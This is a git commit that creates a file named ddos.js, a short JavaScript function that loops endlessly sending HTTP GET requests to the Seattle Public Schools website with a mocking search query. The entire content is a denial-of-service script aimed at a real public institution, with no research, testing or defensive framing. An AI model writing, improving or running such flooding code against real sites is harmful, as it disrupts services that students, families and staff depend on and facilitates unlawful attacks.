2de4e0624eb70c8a094f5f237c6881ae9a6b55d6
肉球の星遅れ <69009801+pawstar-lag@users.noreply.github.com>
2022-04-17 17:40:40 -0700

    Create ddos.js

---
+++ ddos.js
@@ -0,0 +1,8 @@
+let xhr = new XMLHttpRequest();
+function ddossuwu() {
+  while (true) {
+    xhr.open('get', 'https://seattleschools.org/?s=amplify+suck');
+    xhr.send();
+    console.log("HTTP request sent")
+  }
+}
